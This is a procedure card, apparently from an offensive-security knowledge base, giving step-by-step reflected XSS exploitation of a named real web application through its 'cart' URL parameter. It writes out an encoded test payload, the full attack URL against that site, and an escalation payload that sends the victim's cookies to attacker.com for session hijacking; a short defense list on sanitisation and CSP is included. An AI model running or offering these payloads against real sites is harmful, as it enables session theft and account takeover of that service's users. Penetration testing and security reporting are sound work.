---
id: p-239762-2
name: Inject JavaScript Payload via URL Parameter
type: procedure
verified: false
submitted: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.653Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - exploitation
  - javascript-injection
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Inject JavaScript Payload via URL Parameter

## Summary

This procedure exploits an identified XSS vulnerability by crafting and injecting a JavaScript payload into a vulnerable URL parameter in the checkout flow, leading to arbitrary code execution in the victim's browser.

## Description

Targeting applications like https://app.goodhire.com/member/GH.aspx, this procedure builds on parameter analysis to deliver payloads such as <script>alert(document.cookie)</script> via the URL. The payload executes due to unescaped insertion into a JavaScript variable for cart rendering, enabling attacks like session hijacking or data exfiltration. Prerequisites include confirmed vulnerability from prior analysis; outcomes include successful code execution and demonstration of impacts like cookie theft.

## Requirements

1. Confirmed vulnerable URL parameter from analysis
2. Web browser for testing payload delivery
3. Understanding of JavaScript payloads and URL encoding

## Defense

Defensive measures and detection strategies:

- Sanitize and encode all URL parameters before JavaScript insertion (e.g., use textContent instead of innerHTML)
- Implement strict CSP headers to block unsafe-inline scripts
- Log and alert on client-side JavaScript errors or unusual DOM manipulations

## Objectives

1. Deliver and execute arbitrary JavaScript via the URL parameter
2. Demonstrate impact such as session token theft
3. Validate exploitation for reporting or mitigation

## Instructions

### Step 1: Craft the Payload

**Context**: Create a simple test payload to confirm execution.

Encode a basic script like alert('XSS') for URL safety: %3Cscript%3Ealert('XSS')%3C%2Fscript%3E.

> This payload targets the direct JavaScript variable assignment.

### Step 2: Inject via URL

**Context**: Append the payload to the vulnerable parameter and load the page.

Construct the URL as https://app.goodhire.com/member/GH.aspx?cart=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E and navigate to it in the browser.

> Expected output: An alert dialog pops up on page load, confirming JavaScript execution.

### Step 3: Escalate for Impact

**Context**: Test a more malicious payload to simulate real attack.

Use a payload like %3Cscript%3Edocument.location='http://attacker.com?cookie='+document.cookie%3C%2Fscript%3E to exfiltrate cookies.

> Expected output: Browser redirects or network request to attacker server with stolen data, demonstrating session hijacking potential.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[exploitation]]
- [[javascript-injection]]
